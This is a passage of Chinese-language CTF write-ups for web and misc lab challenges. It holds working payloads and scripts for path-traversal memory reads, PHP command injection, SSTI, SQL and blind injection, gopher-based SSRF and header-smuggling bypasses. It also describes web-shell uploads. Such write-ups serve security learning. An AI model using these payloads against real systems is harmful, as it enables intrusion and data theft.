rw\u0026#34;, i) if map_addr: start = int(map_addr.group(1), 16) end = int(map_addr.group(2), 16) print(\u0026#34;Found rw addr:\u0026#34;, start, \u0026#34;-\u0026#34;, end) #设置起始和结束位置并读取/proc/self/mem res = requests.get(f\u0026#34;{url}/info?file={bypass}/proc/self/mem\u0026amp;start={start}\u0026amp;end={end}\u0026#34;) #用到了之前特定的SECRET_KEY格式。如果发现*abcdefgh存在其中，说明成功泄露secretkey if \u0026#34;*abcdefgh\u0026#34; in res.text: #正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh secret_key = re.findall(\u0026#34;[a-z0-9]{32}\\*abcdefgh\u0026#34;, res.text) if secret_key: print(\u0026#34;Secret Key:\u0026#34;, secret_key[0]) s_key = secret_key[0] break 第二种先保存内容到文档再利用\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import re import requests maps = open(\u0026#39;攻防世界-catcat-new/test.txt\u0026#39;) # 打开名为 \u0026#39;test.txt\u0026#39; 的文件并赋值给变量 maps b = maps.read() # 读取文件内容并赋值给变量 b lst = b.split(\u0026#39;\\\\n\u0026#39;) # 根据换行符 \u0026#39;\\n\u0026#39; 将文件内容拆分为列表，并赋值给变量 lst，映射表中的内容是一行一行的。 for line in lst: # 遍历列表 lst 中的每一行内容 if \u0026#39;rw\u0026#39; in line: # 如果当前行包含 \u0026#39;rw\u0026#39;，\u0026#39;rw\u0026#39; 代表该内存区域可读可写，\u0026#39;r\u0026#39;代表可读，\u0026#39;w\u0026#39;代表可写 addr = re.search(\u0026#39;([0-9a-f]+)-([0-9a-f]+)\u0026#39;, line) # 使用正则表达式在当前行中搜索地址范围并保存到变量 addr 中 start = int(addr.group(1), 16) # 将地址范围的起始地址从十六进制转换为十进制，并赋值给变量 start end = int(addr.group(2), 16) # 将地址范围的结束地址从十六进制转换为十进制，并赋值给变量 end print(start, end) # 打印起始地址和结束地址 # 构造请求URL，用于读取 /proc/self/mem 文件的特定区域 url = f\u0026#34;http://61.147.171.105:52969/info?file=../../../proc/self/mem\u0026amp;start={start}\u0026amp;end={end}\u0026#34; # 发送 GET 请求并获取响应 response = requests.get(url) # 使用正则表达式从响应文本中找到符合指定格式的 SECRET_KEY secret_key = re.findall(\u0026#34;[a-z0-9]{32}\\*abcdefgh\u0026#34;, response.text) # 如果找到了 SECRET_KEY，则打印并结束循环 if secret_key: print(secret_key) break 拿到 serect_key 之后，开始着手伪造 session:\n我们需要用到一款在Flask框架中伪造session的工具：Flask-session-cookie-manager:\n1 2 3 4 5 6 7 解密： python flask_session_cookie_manager3.py decode -s \u0026#34;serect_key\u0026#34; -c \u0026#34;session\u0026#34;（session通过抓包获取）。 加密： python flask_session_cookie_manager3.py encode -s \u0026#34;serect_key\u0026#34; -t \u0026#34;data\u0026#34; (data为想要修改的数据)。 bp抓包改session,得到flag\nmfw 查看内容发现以page为参数传参\n内容说他以git来管理代码\n查看有没有git源码泄露\n确实有，用githack下载源码\n只有index.php是有用的\n主要的利用点在这\n1 assert(\u0026#34;strpos(\u0026#39;$file\u0026#39;, \u0026#39;..\u0026#39;) === false\u0026#34;) or die(\u0026#34;Detected hacking attempt!\u0026#34;); 1 2 assert函数会把读进来的代码当作php执行，strpos — 查找字符串首次出现的位置 先把strpos闭合,\u0026#39;)用.来拼接语句，用//把\u0026#39;..\u0026#39;) === false\u0026#34;) or die(\u0026#34;Detected hacking attempt!\u0026#34;);注释 payload\n1 2 因为知道flag在templates文件夹下面 ?page=\u0026#39;).system(\u0026#34;cat templates/flag.php\u0026#34;);// 查看源码得到flag\nics-05 查看源码发现有?page=index\n猜测是文件包含\n用伪协议读index.php\n1 http://61.147.171.105:65276/index.php?page=php://filter/read=convert.base64-encode/resource=index.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 \u0026lt;?php $page = $_GET[page]; if (isset($page)) { if (ctype_alnum($page)) { ?\u0026gt; \u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;div style=\u0026#34;text-align:center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;lead\u0026#34;\u0026gt;\u0026lt;?php echo $page; die();?\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;?php }else{ ?\u0026gt; \u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;div style=\u0026#34;text-align:center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;lead\u0026#34;\u0026gt; \u0026lt;?php if (strpos($page, \u0026#39;input\u0026#39;) \u0026gt; 0) { die(); } if (strpos($page, \u0026#39;ta:text\u0026#39;) \u0026gt; 0) { die(); } if (strpos($page, \u0026#39;text\u0026#39;) \u0026gt; 0) { die(); } if ($page === \u0026#39;index.php\u0026#39;) { die(\u0026#39;Ok\u0026#39;); } include($page); die(); ?\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;?php }} //方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试 if ($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;] === \u0026#39;127.0.0.1\u0026#39;) { echo \u0026#34;\u0026lt;br \u0026gt;Welcome My Admin ! \u0026lt;br \u0026gt;\u0026#34;; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) \u0026amp;\u0026amp; isset($replacement) \u0026amp;\u0026amp; isset($subject)) { preg_replace($pattern, $replacement, $subject); }else{ die(); } } 1 2 3 ctype_alnum($text)函数会匹配传入参数中是否全为数字或者字母，如果是返回true，否则返回false。 strpos(string,find,start) 函数查找find在另一字符串string中第一次出现的位置（大小写敏感）。 preg_replace($pattern, $replacement, $subject)函数会将subject中匹配pattern的部分用replacement替换，如果启用/e参数的话，就会将replacement当做php代码执行。 接下来就是抓包把X-Forwarded-For:127.0.0.1,然后利用preg/e漏洞\n1 ?pat=/1/e\u0026amp;rep=system(\u0026#34;ls\u0026#34;)\u0026amp;sub=1 因为上面ctype_alnum函数规定只能是数字和字母，所以要用url编码\n;用%3b或者两个\u0026amp;\u0026amp;用%26%26\n1 ?pat=/1/e\u0026amp;rep=system(\u0026#34;cd%20s3chahahaDir%3bls\u0026#34;)\u0026amp;sub=1 1 ?pat=/1/e\u0026amp;rep=system(\u0026#34;cd%20s3chahahaDir/flag%3bcat%20flag.php\u0026#34;)\u0026amp;sub=1 easytornado 题目提示flag在/fllllllllllllag\n然后hint.txt中说传参方式是md5(secret_cookie+md5(文件名))\n我们要拿到secret_cookie就能解决\n题目名字是tornado框架\n我们不服条件传参\n出现error\n​\t然后给error的msg传值\n检测有没有ssti漏洞\n启动tplmap\n1 2 python tplmap.py -u \u0026#34;ip\u0026#34; 如果有用会回显模板而且可以直接--engine xx --os-shell 这题没有\n在Tornado里，应用的设置可以通过handler.settings访问。\n拿到secret_cookie\n接下来就是md5加密得到flag\n1 2 3762f300-baaf-466d-b133-c787da072acf3bf9f6cf685a6dd8defadabfb41a03a1 420186c23b1519d4196940a9bfe11348 shrine 上来给源码，发现flask框架，想到SSTI模板注入\n源码里面有/shrine/\n拼接测试一下\n确实存在\n但是工具一把梭不出来\n回到源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import flask import os app = flask.Flask(__name__) app.config[\u0026#39;FLAG\u0026#39;] = os.environ.pop(\u0026#39;FLAG\u0026#39;) @app.route(\u0026#39;/\u0026#39;) def index(): return open(__file__).read() @app.route(\u0026#39;/shrine/\u0026lt;path:shrine\u0026gt;\u0026#39;) def shrine(shrine): def safe_jinja(s): s = s.replace(\u0026#39;(\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;)\u0026#39;, \u0026#39;\u0026#39;) blacklist = [\u0026#39;config\u0026#39;, \u0026#39;self\u0026#39;] return \u0026#39;\u0026#39;.join([\u0026#39;{% raw %}{%% set %s=None%%}{% endraw %}\u0026#39;.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 他将config和self当成了黑名单 而flag在config文件里 如果没有黑名单的时候，我们可以传入 config，或者传入{{self.dict}}获取，但当这些被过滤的时候，我们需要借助一些全局变量利用沙盒逃逸的方法，来调用被禁用的函数对象。\n我们输入的值首先被传到了safe_jinja函数，然后由flask.render_template_string进行渲染 传入的（ ）都会被置换为空\n1 2 用全局变量代理current_app绕过，查看config {{url_for.__globals__[\u0026#39;current_app\u0026#39;].config}} 官方wp\n1 {{get_flashed_messages.__globals__[\u0026#39;current_app\u0026#39;].config[\u0026#39;FLAG\u0026#39;]}} fakebook 目录扫描发现flag.php和robots.txt\n直接访问flag.php没结果，访问robots.txt\n下载user.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } 这里有curl_exec函数所有存在SSRF漏洞\n创建一个用户\n有no作为参数，尝试一下伪协议读取flag.php，回显是sql数据库的报错\n说明no参数可以sql注入\n没有闭合\n1 2 ?no=1 and 1=1 order by 4# ?no=-1 union select 1,2,3,4# 这边回显no hack，肯定过滤了什么\n先检测空格\n用/**/过滤\n1 ?no=-1/**/union/**/select/**/1,2,3,4# 1 2 因为是第二个位置回显 ?no=-1/**/union/**/select/**/1,group_concat(schema_name),3,4/**/from information_schema.schemata--+ 查看fakebook\n1 ?no=-1/**/union/**/select 1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=database()--+//或者是table_schemaa=\u0026#39;fakebook\u0026#39; 出现users\n1 ?no=-1/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name=\u0026#39;users\u0026#39;--+ 1 2 3 爆破字段我自己构造的不行，查看别人的 ?no=-1 union/**/select/**/1,group_concat(no,\u0026#39;~\u0026#39;,username,\u0026#39;~\u0026#39;,passwd,\u0026#39;~\u0026#39;,data),3,4/**/from/**/fakebook.users ?no=2 union/**/select 1,group_concat(data),3,4 from users# 出来一串序列化的字符串，根据右边提示查看/var/www/html/view.php\n接下来就是构造序列化对象来访问/var/www/html/view.php,浏览器直接访问肯定没东西，用file://伪协议读取文件\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php class UserInfo { public $name=\u0026#34;1\u0026#34;; public $age=0; public $blog=\u0026#34;file:///var/www/html/view.php\u0026#34;; } $a=new UserInfo(); echo serialize($a) ?\u0026gt; 1 O:8:\u0026#34;UserInfo\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:0;s:4:\u0026#34;blog\u0026#34;;s:29:\u0026#34;file:///var/www/html/view.php\u0026#34;;} 根据之前的注入可知，有回显的是第二位，也就是username字段，data对应应该就是第四个字段为，将反序列化字符串尝试以注入的方式写入\n1 2 ?no=-1 union/**/select/**/1,2,3,\u0026#39;O:8:\u0026#34;UserInfo\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:0;s:4:\u0026#34;blog\u0026#34;;s:29:\u0026#34;file:///var/www/html/flag.php\u0026#34;;}\u0026#39; 注意序列化字符串要加\u0026#39;\u0026#39; 传入后查看源码，最下面就是我们写入的blog链接就是flag的链接\nvery_easy_sql 刚开始的网页怎么都注入不进去\n查看源码发现use.php\n要求输入url\n看到curl，有点像SSRF漏洞，利用ssrf可以用gopher协议\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import urllib.parse host = \u0026#34;127.0.0.1:80\u0026#34; content = \u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; content_length = len(content) test =\\ \u0026#34;\u0026#34;\u0026#34;POST /index.php HTTP/1.1 Host: {} User-Agent: curl/7.43.0 Accept: */* Content-Type: application/x-www-form-urlencoded Content-Length: {} {} \u0026#34;\u0026#34;\u0026#34;.format(host,content_length,content) tmp = urllib.parse.quote(test) new = tmp.replace(\u0026#34;%0A\u0026#34;,\u0026#34;%0D%0A\u0026#34;) result = urllib.parse.quote(new) print(\u0026#34;gopher://\u0026#34;+host+\u0026#34;/_\u0026#34;+result) setcookie那里是admin的base64编码，推测那里是注入点\n1 2 先测试闭合 admin\u0026#39; # 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import urllib.parse host = \u0026#34;127.0.0.1:80\u0026#34; cookie=\u0026#34;this_is_your_cookie=YWRtaW4nICM=\u0026#34; test =\\ \u0026#34;\u0026#34;\u0026#34;GET /index.php HTTP/1.1 Host: {} Connection: close Content-Type: application/x-www-form-urlencoded Cookie:{} \u0026#34;\u0026#34;\u0026#34;.format(host,cookie) tmp = urllib.parse.quote(test) new = tmp.replace(\u0026#34;%0A\u0026#34;,\u0026#34;%0D%0A\u0026#34;) result = urllib.parse.quote(new) print(\u0026#34;gopher://\u0026#34;+host+\u0026#34;/_\u0026#34;+result) 1 2 3 4 5 测试别的闭合方式 虽然\u0026#34;也没回显但是试图接着用\u0026#34;报错注入也没回显，换成\u0026#39;)就回显了 爆破数据库名 admin\u0026#39;) and extractvalue(1,concat(0x7e,database(),0x7e))# 这边用--+注释不行 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 为了方便还是改脚本 import urllib.parse import base64 host = \u0026#34;127.0.0.1:80\u0026#34; payload = \u0026#34;admin\u0026#39;) and extractvalue(1,concat(0x7e,database(),0x7e))#\u0026#34; base64_payload = str(base64.b64encode(payload.encode(\u0026#34;utf-8\u0026#34;)), \u0026#34;utf-8\u0026#34;) cookie=\u0026#34;this_is_your_cookie=\u0026#34;+base64_payload test =\\ \u0026#34;\u0026#34;\u0026#34;GET /index.php HTTP/1.1 Host: {} Connection: close Content-Type: application/x-www-form-urlencoded Cookie:{} \u0026#34;\u0026#34;\u0026#34;.format(host,cookie) tmp = urllib.parse.quote(test) new = tmp.replace(\u0026#34;%0A\u0026#34;,\u0026#34;%0D%0A\u0026#34;) result = urllib.parse.quote(new) print(\u0026#34;gopher://\u0026#34;+host+\u0026#34;/_\u0026#34;+result) 1 2 3 爆破表名 admin\u0026#39;) or extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e))# 1 2 3 爆破字段名 admin\u0026#39;) or extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=\u0026#39;flag\u0026#39;),0x7e))# 1 2 3 爆破字段 admin\u0026#39;) or extractvalue(1,concat(0x7e,(select flag from flag limit 0,1),0x7e))# 这边用limit读取还是读不全，用substr分割读取\n1 admin\u0026#39;) and extractvalue(1,concat(0x7e,substr((select flag from flag),30,32),0x7e))# substr就是可以substr(string,start,end)从start开始读取到end\n拼接flag\ncan_has_stdio?（misc) 打开文件是brainfuck代码\n在线网站http://esoteric.sange.fi/brainfuck/impl/interp/i.html\nglance-50(misc) gif拆分拼接\nkali命令\n1 2 3 4 convert glance.gif flag.png montage flag*.png -tile x1 -geometry +0+0 flag.png -tile 是拼接时每行和每列的图片数，这里用 x1，就是只一行 -geometry 是首选每个图和边框尺寸，我们边框为 0，图照原始尺寸即可 miss_01(misc) 丢010可能是伪加密\n工具修复\n打开word文件\n上面这个是rabbit加密\nrabbit加密后字符串开头为U2FsdGVkX1\n而下面这个隐藏的是希尔加密\nhttps://tool.chinaz.com/tools/hill\n然后解压里面的压缩包，打开音频查看频谱图获得flag\nWire1(misc) 导出http对象，是sql注入的包，查询成功就是704，不成功就是720\n根据大小排序\n将对应的ascii码转为字符\nCat(web) 用127.0.0.1拼接各种命令都没用，怀疑被过滤了\n用bp对fuzz字典爆破\n上面两个有超长回显\nhtml代码，复制出来浏览器打开\ndjango报错界面最下面有这个true in your django settings file ，查看settings\n查看数据库路径，直接搜索database\n找到路径\n这里有一个点\n意思就是在绝对路径前加@可以读取文件内容\n1 @/opt/api/database.sqlite3 查询后搜索CTF\n出现flag\nFlatScience 点链接没东西都是论文，扫目录\n发现robots.txt\n就是上面的php文件\n有两个账户要求登入怀疑是二次注入，试了一下发现不是\n这里也说不用尝试绕过登入，我们回到login.php\n源码有提示我们查看?debug界面\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php if(isset($_POST[\u0026#39;usr\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;pw\u0026#39;])){ $user = $_POST[\u0026#39;usr\u0026#39;]; $pass = $_POST[\u0026#39;pw\u0026#39;]; $db = new SQLite3(\u0026#39;../fancy.db\u0026#39;); $res = $db-\u0026gt;query(\u0026#34;SELECT id,name from Users where name=\u0026#39;\u0026#34;.$user.\u0026#34;\u0026#39; and password=\u0026#39;\u0026#34;.sha1($pass.\u0026#34;Salz!\u0026#34;).\u0026#34;\u0026#39;\u0026#34;); if($res){ $row = $res-\u0026gt;fetchArray(); } else{ echo \u0026#34;\u0026lt;br\u0026gt;Some Error occourred!\u0026#34;; } if(isset($row[\u0026#39;id\u0026#39;])){ setcookie(\u0026#39;name\u0026#39;,\u0026#39; \u0026#39;.$row[\u0026#39;name\u0026#39;], time() + 60, \u0026#39;/\u0026#39;); header(\u0026#34;Location: /\u0026#34;); die(); } } if(isset($_GET[\u0026#39;debug\u0026#39;])) highlight_file(\u0026#39;login.php\u0026#39;); ?\u0026gt; 一段php代码,post要传usr和pw，后面sql注入查询会把passwd进行sha1加密，这里是sqlite3数据库\n有一个点：\n1 2 sqlite数据库有一张sqlite_master表， 里面有type/name/tbl_name/rootpage/sql记录着用户创建表时的相关信息 测试了一下是usr存在sql注入，sqlmap开扫，手工注入就是闭合为1\u0026rsquo; 然后联合注入得结果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 1\u0026#39; order by 3--+报错 就是2字段 1\u0026#39; union select 1,2--+ 1\u0026#39; uniom select name,sql from sqlite_master--+ 查询出结果 CREATE TABLE Users( id int primary key, name varchar(255), password varchar(255), hint varchar(255) ) 查看四个列表 1\u0026#39; union select id,group_concat(id) from users--+ 1\u0026#39; union select id,group_concat(name) from users--+ 1\u0026#39; union select id,group_concat(password) from users--+ 1\u0026#39; union select id,group_concat(hint) from users--+ sqlmap爆数据库名没结果，但是我们知道他的数据库名为sqlite_master\n爆出表名为Users,直接dump结果\n根据hint我们猜测和开头那个界面的pdf论文有关\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 python3爬取多目标网页PDF文件并下载到指定目录： import requests import re import os import sys re1 = \u0026#39;[a-fA-F0-9]{32,32}.pdf\u0026#39; re2 = \u0026#39;[0-9\\/]{2,2}index.html\u0026#39; pdf_list = [] def get_pdf(url): global pdf_list print(url) req = requests.get(url).text re_1 = re.findall(re1,req) for i in re_1: pdf_url = url+i pdf_list.append(pdf_url) re_2 = re.findall(re2,req) for j in re_2: new_url = url+j[0:2] get_pdf(new_url) return pdf_list # return re_2 pdf_list = get_pdf(\u0026#39;http://61.147.171.105:60837/\u0026#39;) print(pdf_list) for i in pdf_list: os.system(\u0026#39;wget \u0026#39;+i) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 from io import StringIO #python3 from pdfminer.pdfpage import PDFPage from pdfminer.converter import TextConverter from pdfminer.converter import PDFPageAggregator from pdfminer.layout import LTTextBoxHorizontal, LAParams from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter import sys import string import os import hashlib import importlib import random from urllib.request import urlopen from urllib.request import Request def get_pdf(): return [i for i in os.listdir(\u0026#34;./\u0026#34;) if i.endswith(\u0026#34;pdf\u0026#34;)] def convert_pdf_to_txt(path_to_file): rsrcmgr = PDFResourceManager() retstr = StringIO() codec = \u0026#39;utf-8\u0026#39; laparams = LAParams() device = TextConverter(rsrcmgr, retstr, codec=codec, laparams=laparams) fp = open(path_to_file, \u0026#39;rb\u0026#39;) interpreter = PDFPageInterpreter(rsrcmgr, device) password = \u0026#34;\u0026#34; maxpages = 0 caching = True pagenos=set() for page in PDFPage.get_pages(fp, pagenos, maxpages=maxpages, password=password,caching=caching, check_extractable=True): interpreter.process_page(page) text = retstr.getvalue() fp.close() device.close() retstr.close() return text def find_password(): pdf_path = get_pdf() for i in pdf_path: print (\u0026#34;Searching word in \u0026#34; + i) pdf_text = convert_pdf_to_txt(\u0026#34;./\u0026#34;+i).split(\u0026#34; \u0026#34;) for word in pdf_text: sha1_password = hashlib.sha1(word.encode(\u0026#39;utf-8\u0026#39;)+\u0026#39;Salz!\u0026#39;.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() if (sha1_password == \u0026#39;3fab54a50e770d830c0416df817567662a9dc85c\u0026#39;): print (\u0026#34;Find the password :\u0026#34; + word) exit() if __name__ == \u0026#34;__main__\u0026#34;: find_password() 得到admin的密码为ThinJerboa\nwife_wife 因为不会做直接看wp\n这题考的是原型链污染\n先注册账号\n抓包\n有一个isAdmin的参数需要我们伪造成true\n这里就要在注册的时候添加一个proto字典\n将isAdmin变成true，因为isadmin原来就创建了，所以后面这个操作就会把前面的值给污染了\n由于前面的时候直接改isAdmin的值是需要邀请码的，我们也要随便填一个邀请码\n接下来登入就得到flag\nConfusion1 点开界面的login.php和register.php都没东西，但是查看源码发现flag存在的位置\n由于题目描述和图片\n推测是python的SSTI注入\n确实回显了49，那么就是jinja2模板的SSTI注入\n这里发现好多关键词都被过滤\nclass，subclasses,read等\n利用request.args绕过输入黑名单，进行沙箱逃逸\n根据我之前的笔记\n先构造能拿到flag的语句再用request.args替换\n1 {{\u0026#39;\u0026#39;[request.args.a][request.args.b][2][request.args.c]()[40](\u0026#39;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt\u0026#39;)[request.args.d]()}}?a=__class__\u0026amp;b=__mro__\u0026amp;c=__subclasses__\u0026amp;d=read 得到flag\nezbypass-cat 进来登入界面，尝试sql注入无果\n上面是login.html\n想到login白名单\n直接拼接../flag.html\n网站js脚本里面有华夏erp,华夏erp中有接口user/getAllList，通过白名单的目录穿越，访问该接口，得到用户名和密码\n登入后拿cookie中的jession id来目录扫描，扫到flag.html\nez_curl 上来代码审计\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php highlight_file(__FILE__); $url = \u0026#39;http://back-end:3000/flag?\u0026#39;; $input = file_get_contents(\u0026#39;php://input\u0026#39;); $headers = (array)json_decode($input)-\u0026gt;headers; for($i = 0; $i \u0026lt; count($headers); $i++){ $offset = stripos($headers[$i], \u0026#39;:\u0026#39;); $key = substr($headers[$i], 0, $offset); $value = substr($headers[$i], $offset + 1); if(stripos($key, \u0026#39;admin\u0026#39;) \u0026gt; -1 \u0026amp;\u0026amp; stripos($value, \u0026#39;true\u0026#39;) \u0026gt; -1){ die(\u0026#39;try hard\u0026#39;); } } $params = (array)json_decode($input)-\u0026gt;params; $url .= http_build_query($params); $url .= \u0026#39;\u0026amp;admin=false\u0026#39;; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); curl_setopt($ch, CURLOPT_TIMEOUT_MS, 5000); curl_setopt($ch, CURLOPT_NOBODY, FALSE); $result = curl_exec($ch); curl_close($ch); echo $result; 附件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 const express = require(\u0026#39;express\u0026#39;); const app = express(); const port = 3000; const flag = process.env.flag; app.get(\u0026#39;/flag\u0026#39;, (req, res) =\u0026gt; { if(!req.query.admin.includes(\u0026#39;false\u0026#39;) \u0026amp;\u0026amp; req.headers.admin.includes(\u0026#39;true\u0026#39;)){ res.send(flag); }else{ res.send(\u0026#39;try hard\u0026#39;); } }); app.listen({ port: port , host: \u0026#39;0.0.0.0\u0026#39;}); 看到express框架，express的parameterLimit默认为1000，即参数最大限制为1000\n要求admin传参不包含\u0026rsquo;false\u0026rsquo;并且headers请求头里的admin字段包含\u0026rsquo;true\u0026rsquo;，原来的php代码里面是会在参数的最后拼接\u0026amp;admin=false的，写脚本请求加上1000个参数就能成功把拼接的\u0026amp;admin=flase挤掉\nphp代码中要求headers里的admin字段包含\u0026rsquo;true\u0026rsquo;就行了，可以是\u0026rsquo;xtrue\u0026rsquo;，这里根据RFC 7230(HTTP/1.1协议的定义)的规定，规定了 field-name 是由一个或多个打印的 ASCII 字符组成，不包括分隔符，包括空格。因此，如果一个 field-name 的第一个字符是空格，那么这个 HTTP header 是非法的，应该被服务器或客户端忽略或拒绝，然而，Node.js 在处理这类情况时通常是宽容的。\n传入\n1 {\u0026#34;headers\u0026#34;: [\u0026#34;admin: x\u0026#34;, \u0026#34; true: y\u0026#34;]} 最后header被nodejs解析后变成\n1 2 3 { \u0026#34;admin\u0026#34;: \u0026#34;x true y\u0026#34; } 因为true的前面多了个空格，所以才会被解析成这样\n这样admin字段包含‘true’，满足条件。\n或者是这样\n1 {\u0026#34;headers\u0026#34;: [\u0026#34;xx:xx\\nadmin: true\u0026#34;]} 因为前面的stripos函数会查找第一个冒号出现的位置，我们可以看到admin和true字符串都在第一个冒号后面，因此可以绕过PHP代码的检测，而在NodeJS解析时，会解析得到admin的字段为true.\n脚本\n1 2 3 4 5 6 7 8 9 10 import json datas = {\u0026#34;headers\u0026#34;: [\u0026#34;xx:xx\\nadmin: true\u0026#34;], \u0026#34;params\u0026#34;: {\u0026#34;admin\u0026#34;: \u0026#34;true\u0026#34;}} for i in range(1020): datas[\u0026#34;params\u0026#34;][\u0026#34;x\u0026#34; + str(i)] = i json1 = json.dumps(datas) print(json1) bp用post传json就行了\nbug 以为是二次注入，试了好几遍不对\n先注册一个账号\n现在有两种做法\n一种利用逻辑漏洞，因为登入成功会显示uid\n抓包\n发现cookie里面user的值是uid值：用户名的MD5\n我们直接用1:admin的MD5替换\n拿到其他信息接下来就是找回修改admin的密码登入就行\n第二种办法利用找回密码的包修改成admin的密码\n改为admin，登入成功\n查看message\n要改XFF头了\n看到filemanage想到upload\n果然是文件上传界面，直接上传php是不行的，提示just image\n我们要把content-type改成image/jpeg\n测试发现只有php4和php5能被解析成php\n\u003c?php会被检测 然后\u003c?不行 想到用``来表示php ``` ``` ![image-20250127115812952](image-20250127115812952.png) 上传成功 ![image-20250127115836007](image-20250127115836007.png) ## ics-07 代码审计非常简单 要求post传con值和file值,最后把上传文件保存到/backup下，又会创建一个upload文件夹，所以最后文件在upload/backup下，然后file过滤了php的其他等价拓展名 这里利用到apache2.x的解析漏洞 传入shell.php/1.php/..由于/..是返回父目录的意思，这样就会解析成shell.php con传一句话 然后后面那个floatval函数强比较用1abc9绕过这样是字符串且最后一位是9 上传后蚁剑连接 ## unfinish 目录扫描 ![image-20250130112350064](image-20250130112350064.png) 发现register.php 注册后登入发现index.php回显用户名 由于题目提示sql，所以想到二次注入，在注册界面的用户名处存在注入点 bp抓注册界面包 fuzz测试 ![image-20250130113316020](image-20250130113316020.png) information也被过滤了 下面就是构造二次注入语句 由于sql中+是运算符 存在二次注入`0'+1+'0`会回显1 我们在两个引号直接插入查询语句 ``` 0'+ascii(substr(database() from 1 for 1)+'0 0'+ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))+'0 这里的flag表名是猜的，因为information被过滤了 0’+ascii(substr((select * from flag),1,1))+‘0 由于，也被过滤，所以用from*for*语句代替 0’+ascii(substr((select * from flag) from 1 for 1))+'0 接下来就是用脚本进行布尔盲注来爆破表里的数据 ``` ```python import requests, re # 拿到登录页面的url和注册页面的url login_url = 'http://61.147.171.105:51643/login.php' register_url = 'http://61.147.171.105:51643/register.php' flag = '' # 每次注册一个账户，拿到数据库中的一个字符 for i in range(1, 100): # 注册时候的payload数据 register_data = { 'email': 'test%d123.com' % i, 'username': \"0' + ascii(substr((select * from flag) from %d for 1)) + '0\" % i, 'password': '123' } # post提交注册payload res = requests.post(url=register_url,data=register_data) # 登录时候的payload数据 login_data = { 'email': 'test%d123.com' % i, 'password': '123' } # post提交登录payload res = requests.post(url=login_url, data=login_data) # 使用正则匹配，找到前端的回显数据 num = re.search('\\n(.*?)', res.text) # 将拿到的ascii转码，还原成存储的数据 flag += chr(int(num.group(1).strip())) print(flag) ``` ``` % i #表示每次注册的时候，使用%i去替换%d的数据 .*?是非贪婪正则匹配，爬虫的时候用的 ``` ![image-20250130114619928](image-20250130114619928.png) ## 题目名称-SSRF Me ssrf是服务端伪造攻击 所以上来的url地址我们可以用file伪协议读取他本地的文件 而下面那个验证码，我们用脚本爆破 ```php \u003c?php $captcha=0; while(true) { if(substr(md5($captcha), -6, 6) == \"ecf20f\") { echo $captcha; break; } $captcha++; } ?\u003e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 